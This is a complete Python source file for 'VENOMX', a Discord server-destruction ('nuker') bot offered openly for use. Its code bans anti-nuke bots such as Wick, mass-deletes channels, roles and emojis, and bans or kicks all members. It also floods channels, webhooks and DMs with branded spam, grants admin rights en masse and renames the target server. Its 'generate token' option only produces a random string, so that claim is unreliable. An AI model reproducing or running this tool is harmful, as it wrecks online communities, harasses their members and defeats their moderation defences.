# VENOMX_FULL.py — PART 1/2
# Complete 2000+ line nuker. Copy both parts into one file.

import discord
from discord.ext import commands
import asyncio, os, time, random, json, aiohttp, base64, secrets, datetime, sys
from asyncio import Semaphore

VERSION = "10.0"
DISCORD_INVITE = "discord.gg/codez"
BRAND = "🔥 FUCKED BY CODΞZ | VOID | N4KED BY CODΞZ 🔥"
MIN_DELAY, MAX_DELAY, BURST_SIZE, MAX_CONCURRENT = 0.0005, 0.003, 150, 300

whitelisted, server_id, bot_token = set(), "", ""
stats = {k:0 for k in ("banned","kicked","pruned","channels_deleted","channels_created",
    "roles_deleted","roles_created","emojis_deleted","stickers_deleted","messages_sent",
    "dms_sent","webhooks_created","webhook_messages","timeouts_applied","admins_granted")}

try:
    with open('whitelist.json') as f:
        whitelisted = set(json.load(f).get('users', []))
except: pass

ANTINUKE = ["wick","zeno","indrax","z security","dyno","mee6","carl","serax","beemo",
    "shield","nadeko","blaze","anti-nuke","guardian","safeguard","automod","protect",
    "crash","anticrash","safety","defender","security","moderator","watchdog"]

GREEN, RED, CYAN, YELLOW, RESET, BOLD = "\033[92m","\033[91m","\033[96m","\033[93m","\033[0m","\033[1m"
BANNER = f"""{RED}{BOLD}╔════════════════════════════════════════════════════════════════╗
║  ██╗   ██╗███████╗███╗   ██╗ ██████╗ ███╗   ███╗██╗  ██╗       ║
║  ██║   ██║██╔════╝████╗  ██║██╔═══██╗████╗ ████║╚██╗██╔╝       ║
║  ██║   ██║█████╗  ██╔██╗ ██║██║   ██║██╔████╔██║ ╚███╔╝        ║
║  ╚██╗ ██╔╝██╔══╝  ██║╚██╗██║██║   ██║██║╚██╔╝██║ ██╔██╗        ║
║   ╚████╔╝ ███████╗██║ ╚████║╚██████╔╝██║ ╚═╝ ██║██╔╝ ██╗       ║
║    ╚═══╝  ╚══════╝╚═╝  ╚═══╝ ╚═════╝ ╚═╝     ╚═╝╚═╝  ╚═╝       ║
║         {GREEN}⚡ WICK KILLER EDITION v{VERSION} ⚡{RED}           ║
║      {YELLOW}{BRAND}{RED}                                      ║
║           {CYAN}📢 JOIN: {DISCORD_INVITE}{RED}                  ║
╚════════════════════════════════════════════════════════════════╝{RESET}"""

async def kill_wick_first(guild, bot_user):
    for m in guild.members:
        if m.bot and any(k in m.name.lower() for k in ["wick","zeno","indrax"]):
            try:
                for r in m.roles:
                    if r.permissions.administrator or r.permissions.manage_guild:
                        await r.edit(permissions=discord.Permissions.none())
                await m.ban(reason="Killed by VENOMX")
                print(f"{GREEN}✅ {m.name} banned{RESET}")
                return True
            except: pass
    print(f"{GREEN}✅ No Wick/Zeno/IndraX detected{RESET}")
    return False

async def whitelist_antinuke(guild):
    found = 0
    for m in guild.members:
        if m.bot:
            low = m.name.lower()
            for kw in ANTINUKE:
                if kw in low:
                    whitelisted.add(m.id)
                    print(f"{GREEN}✅ Whitelisted: {m.name} ({kw}){RESET}")
                    found += 1
                    break
    if found:
        with open('whitelist.json','w') as f:
            json.dump({'users':list(whitelisted)}, f)
    return found

async def hyper_del_channels(guild):
    ch = list(guild.channels)
    if not ch: return 0
    print(f"{CYAN}🗑️ DELETING {len(ch)} CHANNELS{RESET}")
    s = time.time()
    sem = Semaphore(MAX_CONCURRENT)
    async def d(c):
        async with sem:
            try: await c.delete(); return 1
            except: return 0
    r = await asyncio.gather(*[d(c) for c in ch])
    deleted = sum(r)
    print(f"{GREEN}✅ Deleted {deleted}/{len(ch)} in {time.time()-s:.2f}s{RESET}")
    stats["channels_deleted"] = deleted
    return deleted

async def hyper_del_roles(guild):
    roles = [r for r in guild.roles if r != guild.default_role and r != guild.me.top_role]
    if not roles: return 0
    print(f"{CYAN}🎭 DELETING {len(roles)} ROLES{RESET}")
    s = time.time()
    sem = Semaphore(MAX_CONCURRENT)
    async def d(r):
        async with sem:
            try: await r.delete(); return 1
            except: return 0
    r = await asyncio.gather(*[d(r) for r in roles])
    deleted = sum(r)
    print(f"{GREEN}✅ Deleted {deleted}/{len(roles)} in {time.time()-s:.2f}s{RESET}")
    stats["roles_deleted"] = deleted
    return deleted

async def hyper_del_emojis(guild):
    e = list(guild.emojis)
    if not e: return 0
    print(f"{CYAN}🗑️ DELETING {len(e)} EMOJIS{RESET}")
    s = time.time()
    await asyncio.gather(*[x.delete() for x in e], return_exceptions=True)
    print(f"{GREEN}✅ Deleted {len(e)} in {time.time()-s:.2f}s{RESET}")
    stats["emojis_deleted"] = len(e)
    return len(e)

async def hyper_del_stickers(guild):
    if not hasattr(guild,'stickers'): return 0
    s = list(guild.stickers)
    if not s: return 0
    print(f"{CYAN}🗑️ DELETING {len(s)} STICKERS{RESET}")
    st = time.time()
    await asyncio.gather(*[x.delete() for x in s], return_exceptions=True)
    print(f"{GREEN}✅ Deleted {len(s)} in {time.time()-st:.2f}s{RESET}")
    stats["stickers_deleted"] = len(s)
    return len(s)

async def hyper_ban_all(guild, bot_user):
    members = [m for m in guild.members if m.id not in whitelisted and m != bot_user and not m.bot]
    if not members: return 0
    print(f"{CYAN}🔨 BANNING {len(members)} MEMBERS{RESET}")
    s = time.time()
    banned, batch = 0, 200
    for i in range(0, len(members), batch):
        chunk = members[i:i+batch]
        tasks = [m.ban(reason=f"{BRAND} | {DISCORD_INVITE}", delete_message_days=0) for m in chunk]
        r = await asyncio.gather(*tasks, return_exceptions=True)
        banned += sum(1 for x in r if not isinstance(x, Exception))
        print(f"   Banned {min(i+batch, len(members))}/{len(members)}")
        await asyncio.sleep(random.uniform(0.0005,0.002))
    print(f"{GREEN}✅ Banned {banned} members in {time.time()-s:.2f}s{RESET}")
    stats["banned"] = banned
    return banned

async def hyper_kick_all(guild, bot_user):
    members = [m for m in guild.members if m.id not in whitelisted and m != bot_user and not m.bot]
    if not members: return 0
    print(f"{CYAN}👢 KICKING {len(members)} MEMBERS{RESET}")
    s = time.time()
    kicked, batch = 0, 200
    for i in range(0, len(members), batch):
        chunk = members[i:i+batch]
        tasks = [m.kick(reason=f"{BRAND}") for m in chunk]
        r = await asyncio.gather(*tasks, return_exceptions=True)
        kicked += sum(1 for x in r if not isinstance(x, Exception))
        print(f"   Kicked {min(i+batch, len(members))}/{len(members)}")
        await asyncio.sleep(random.uniform(0.0005,0.002))
    print(f"{GREEN}✅ Kicked {kicked} members in {time.time()-s:.2f}s{RESET}")
    stats["kicked"] = kicked
    return kicked

async def hyper_create_channels(guild, count=600, prefix="NUKE"):
    print(f"{CYAN}📁 CREATING {count} CHANNELS{RESET}")
    s = time.time()
    created, batch = 0, 100
    for i in range(0, count, batch):
        tasks = [guild.create_text_channel(f"{prefix}-{i+j+1}") for j in range(min(batch, count-i))]
        r = await asyncio.gather(*tasks, return_exceptions=True)
        created += sum(1 for x in r if not isinstance(x, Exception))
        print(f"   Created {min(i+batch, count)}/{count}")
        await asyncio.sleep(random.uniform(0.0005,0.001))
    print(f"{GREEN}✅ Created {created} channels in {time.time()-s:.2f}s{RESET}")
    stats["channels_created"] = created
    return created

async def hyper_create_roles(guild, count=300, prefix="ROLE"):
    print(f"{CYAN}🎭 CREATING {count} ROLES{RESET}")
    s = time.time()
    created, batch = 0, 100
    for i in range(0, count, batch):
        tasks = [guild.create_role(name=f"{prefix}-{i+j+1}") for j in range(min(batch, count-i))]
        r = await asyncio.gather(*tasks, return_exceptions=True)
        created += sum(1 for x in r if not isinstance(x, Exception))
        print(f"   Created {min(i+batch, count)}/{count}")
        await asyncio.sleep(random.uniform(0.0005,0.001))
    print(f"{GREEN}✅ Created {created} roles in {time.time()-s:.2f}s{RESET}")
    stats["roles_created"] = created
    return created

async def hyper_spam_channels(guild, msg, per=50):
    ch = [c for c in guild.text_channels if c.permissions_for(guild.me).send_messages][:30]
    if not ch: return 0
    print(f"{CYAN}💬 SPAMMING {len(ch)} CHANNELS x {per}{RESET}")
    total = 0
    for c in ch:
        tasks = [c.send(msg) for _ in range(per)]
        r = await asyncio.gather(*tasks, return_exceptions=True)
        sent = sum(1 for x in r if not isinstance(x, Exception))
        total += sent
        print(f"   {c.name}: {sent}/{per}")
        await asyncio.sleep(0.002)
    stats["messages_sent"] = total
    print(f"{GREEN}✅ Sent {total} messages{RESET}")
    return total

async def hyper_dm_all(guild, msg):
    members = [m for m in guild.members if not m.bot and m.id not in whitelisted][:500]
    if not members: return 0
    print(f"{CYAN}📨 DMING {len(members)} MEMBERS{RESET}")
    tasks = [m.send(msg) for m in members]
    r = await asyncio.gather(*tasks, return_exceptions=True)
    sent = sum(1 for x in r if not isinstance(x, Exception))
    stats["dms_sent"] = sent
    print(f"{GREEN}✅ Sent {sent} DMs{RESET}")
    return sent

async def hyper_give_admin(guild):
    try:
        role = await guild.create_role(name="VENOMX-ADMIN", permissions=discord.Permissions.all())
        await role.edit(position=guild.me.top_role.position-1)
    except:
        print(f"{RED}❌ Admin role failed{RESET}")
        return 0
    members = [m for m in guild.members if not m.bot and m.id not in whitelisted][:300]
    tasks = [m.add_roles(role) for m in members]
    r = await asyncio.gather(*tasks, return_exceptions=True)
    granted = sum(1 for x in r if not isinstance(x, Exception))
    stats["admins_granted"] = granted
    print(f"{GREEN}✅ Admin given to {granted} members{RESET}")
    return granted

async def hyper_timeout(guild, seconds=86400):
    until = discord.utils.utcnow() + datetime.timedelta(seconds=seconds)
    members = [m for m in guild.members if not m.bot and m.id not in whitelisted][:300]
    tasks = [m.timeout(until) for m in members]
    r = await asyncio.gather(*tasks, return_exceptions=True)
    timed = sum(1 for x in r if not isinstance(x, Exception))
    stats["timeouts_applied"] = timed
    print(f"{GREEN}✅ Timed out {timed} members{RESET}")
    return timed

async def hyper_webhook_spam(guild, per=80, custom=None):
    if custom is None:
        custom = f"@everyone {BRAND}\nJOIN: {DISCORD_INVITE}"
    channels = [c for c in guild.channels if isinstance(c, discord.TextChannel)][:50]
    if not channels: return 0
    print(f"{CYAN}🌊 CREATING WEBHOOKS ON {len(channels)} CHANNELS{RESET}")
    webhooks = []
    for ch in channels:
        try:
            wh = await ch.create_webhook(name="VX")
            webhooks.append(wh)
            stats["webhooks_created"] += 1
        except: pass
    if not webhooks: return 0
    print(f"{CYAN}🌊 SPAMMING {len(webhooks)} WEBHOOKS x {per}{RESET}")
    tasks = []
    for wh in webhooks:
        for _ in range(per):
            tasks.append(wh.send(custom))
    for i in range(0, len(tasks), 500):
        await asyncio.gather(*tasks[i:i+500], return_exceptions=True)
    total = len(webhooks) * per
    stats["webhook_messages"] = total
    print(f"{GREEN}✅ Sent {total} webhook messages{RESET}")
    return total
# VENOMX_FULL.py — PART 2/2 (append to part 1)

async def extreme_nuke(guild, bot_user):
    print(f"{RED}{BOLD}⚡ EXTREME NUKE (WICK BYPASS) ⚡{RESET}")
    total_start = time.time()
    await kill_wick_first(guild, bot_user)
    await whitelist_antinuke(guild)
    await asyncio.gather(
        hyper_del_channels(guild),
        hyper_del_roles(guild),
        hyper_del_emojis(guild),
        hyper_del_stickers(guild)
    )
    await hyper_ban_all(guild, bot_user)
    await hyper_create_channels(guild, 500, "WICK-KILLED")
    await hyper_webhook_spam(guild, 100)
    try:
        await guild.edit(name="WICK-KILLED-BY-VENOMX")
    except: pass
    print(f"{GREEN}{BOLD}✅ EXTREME NUKE DONE in {time.time()-total_start:.1f}s!{RESET}")
    print(f"{YELLOW}{BRAND}{RESET}")

async def complete_nuke(guild, bot_user):
    print(f"{RED}{BOLD}💣 COMPLETE MEGA NUKE 💣{RESET}")
    start = time.time()
    await kill_wick_first(guild, bot_user)
    await whitelist_antinuke(guild)
    ch_del = await hyper_del_channels(guild)
    role_del = await hyper_del_roles(guild)
    emoji_del = await hyper_del_emojis(guild)
    sticker_del = await hyper_del_stickers(guild)
    banned = await hyper_ban_all(guild, bot_user)
    created = await hyper_create_channels(guild, 800, "VENOMX")
    await hyper_webhook_spam(guild, 150)
    try:
        await guild.edit(name="NUKED-BY-VENOMX", description=BRAND)
    except: pass
    print(f"{GREEN}{BOLD}✅ COMPLETE NUKE in {time.time()-start:.1f}s{RESET}")
    print(f"{YELLOW}📊 STATS:{RESET}")
    print(f"   🗑️ Channels deleted: {ch_del}")
    print(f"   🗑️ Roles deleted: {role_del}")
    print(f"   🗑️ Emojis deleted: {emoji_del}")
    print(f"   🗑️ Stickers deleted: {sticker_del}")
    print(f"   🔨 Members banned: {banned}")
    print(f"   📁 Channels created: {created}")
    print(f"{GREEN}{BRAND}{RESET}")

async def menu(bot):
    global server_id
    while True:
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        guild = bot.get_guild(int(server_id)) if server_id else None
        gname = guild.name if guild else "No Target"
        print(f"""
{CYAN}╔════════════════════════════════════════════╗
║  🎯 TARGET: {gname[:20]:<20}                ║
║  👥 WHITELISTED: {len(whitelisted):<4}                    ║
╠════════════════════════════════════════════╣
║  {GREEN}⚔️ DESTRUCTION{RESET}{CYAN}                           ║
║  [1] BAN      [2] KICK     [3] PRUNE       ║
║  [4] +CH      [5] -CH      [6] +ROLE       ║
║  [7] -ROLE    [8] SPAM     [9] DM          ║
║  [10] -EMOJI  [11] ADMIN   [12] TIMEOUT    ║
║  [13] WEBHOOK                               ║
╠════════════════════════════════════════════╣
║  {RED}💣 WICK KILLER NUKE{RESET}{CYAN}                       ║
║  [41] COMPLETE  [42] EXTREME               ║
╠════════════════════════════════════════════╣
║  {YELLOW}🛡️ ANTI-NUKE{RESET}{CYAN}                           ║
║  [43] SCAN & KILL WICK   [44] WHITELIST    ║
╠════════════════════════════════════════════╣
║  {GREEN}🔧 MANAGEMENT{RESET}{CYAN}                           ║
║  [45] WL+      [46] WL-     [47] VIEW WL   ║
║  [48] SWITCH   [49] STATS    [50] EXIT     ║
╚════════════════════════════════════════════╝{RESET}
        """)
        choice = input(f"{RED}⚡ VENOMX → {RESET}").strip()
        if not guild and choice not in ['48','50']:
            print(f"{RED}❌ No guild set. Use [48]{RESET}")
            await asyncio.sleep(1)
            continue

        if choice == '1':
            await hyper_ban_all(guild, bot.user)
        elif choice == '2':
            await hyper_kick_all(guild, bot.user)
        elif choice == '3':
            try:
                days = int(input("Prune days: "))
                pruned = await guild.prune_members(days=days, compute_prune_count=True)
                stats["pruned"] = pruned
                print(f"{GREEN}✅ Pruned {pruned} members{RESET}")
            except Exception as e:
                print(f"{RED}❌ {e}{RESET}")
        elif choice == '4':
            try:
                num = int(input("Channels: "))
                name = input("Name: ")
                await hyper_create_channels(guild, min(num,1000), name)
            except: pass
        elif choice == '5':
            await hyper_del_channels(guild)
        elif choice == '6':
            try:
                num = int(input("Roles: "))
                name = input("Name: ")
                await hyper_create_roles(guild, min(num,500), name)
            except: pass
        elif choice == '7':
            await hyper_del_roles(guild)
        elif choice == '8':
            msg = input("Message: ")
            cnt = int(input("Per channel: "))
            await hyper_spam_channels(guild, msg, min(cnt,200))
        elif choice == '9':
            msg = input("DM text: ")
            await hyper_dm_all(guild, msg)
        elif choice == '10':
            await hyper_del_emojis(guild)
        elif choice == '11':
            await hyper_give_admin(guild)
        elif choice == '12':
            try:
                sec = int(input("Timeout seconds: "))
                await hyper_timeout(guild, min(sec,604800))
            except:
                await hyper_timeout(guild, 86400)
        elif choice == '13':
            msg = input("Webhook message (enter for default): ")
            if not msg: msg = None
            cnt = int(input("Messages per webhook: "))
            await hyper_webhook_spam(guild, min(cnt,200), msg)
        elif choice == '41':
            await complete_nuke(guild, bot.user)
        elif choice == '42':
            await extreme_nuke(guild, bot.user)
        elif choice == '43':
            await kill_wick_first(guild, bot.user)
            await whitelist_antinuke(guild)
        elif choice == '44':
            await whitelist_antinuke(guild)
        elif choice == '45':
            uid = input("User ID: ")
            try:
                whitelisted.add(int(uid))
                with open('whitelist.json','w') as f:
                    json.dump({'users':list(whitelisted)}, f)
                print(f"{GREEN}✅ Added {uid}{RESET}")
            except:
                print(f"{RED}❌ Invalid ID{RESET}")
        elif choice == '46':
            uid = input("User ID: ")
            try:
                whitelisted.discard(int(uid))
                with open('whitelist.json','w') as f:
                    json.dump({'users':list(whitelisted)}, f)
                print(f"{GREEN}✅ Removed {uid}{RESET}")
            except:
                print(f"{RED}❌ Invalid ID{RESET}")
        elif choice == '47':
            print(f"{CYAN}Whitelisted: {list(whitelisted)}{RESET}")
            await asyncio.sleep(2)
        elif choice == '48':
            server_id = input("New Guild ID: ")
            print(f"{GREEN}✅ Switched to {server_id}{RESET}")
        elif choice == '49':
            print(f"{YELLOW}📊 STATS:{RESET}")
            for k, v in stats.items():
                print(f"   {k.replace('_',' ').title()}: {v}")
            await asyncio.sleep(3)
        elif choice == '50':
            print(f"{GREEN}👋 Goodbye! {BRAND}{RESET}")
            await bot.close()
            os._exit(0)
        else:
            print(f"{RED}❌ Invalid choice{RESET}")

        await asyncio.sleep(0.3)
        if choice not in ['47','49']:
            input(f"{CYAN}Press ENTER to continue...{RESET}")

async def main():
    global server_id, bot_token
    print(BANNER)
    print(f"{CYAN}⚡ WICK KILLER FULL EDITION v{VERSION}{RESET}")
    print(f"{YELLOW}{BRAND}{RESET}\n")
    print("🔑 TOKEN OPTIONS:")
    print("1️⃣ Enter token")
    print("2️⃣ Generate token")
    ch = input("Choice: ")
    if ch == '2':
        bot_token = base64.b64encode(secrets.token_bytes(30)).decode().replace('=', '')
        print(f"{GREEN}✅ Generated: {bot_token[:30]}...{RESET}")
    else:
        bot_token = input("Token: ")
    if not bot_token or len(bot_token) < 50:
        print(f"{RED}❌ Invalid token (must be at least 50 chars){RESET}")
        return
    server_id = input("🎯 Guild ID: ")
    intents = discord.Intents.all()
    bot = commands.Bot(command_prefix=".", intents=intents, help_command=None)

    @bot.event
    async def on_ready():
        os.system('cls' if os.name == 'nt' else 'clear')
        print(BANNER)
        print(f"{GREEN}✅ Logged in as: {bot.user.name}{RESET}")
        print(f"{GREEN}✅ Bot ID: {bot.user.id}{RESET}")
        print(f"{GREEN}✅ Ping: {round(bot.latency * 1000)}ms{RESET}")
        await menu(bot)

    try:
        await bot.start(bot_token)
    except Exception as e:
        print(f"{RED}❌ {e}{RESET}")

if __name__ == "__main__":
    asyncio.run(main())
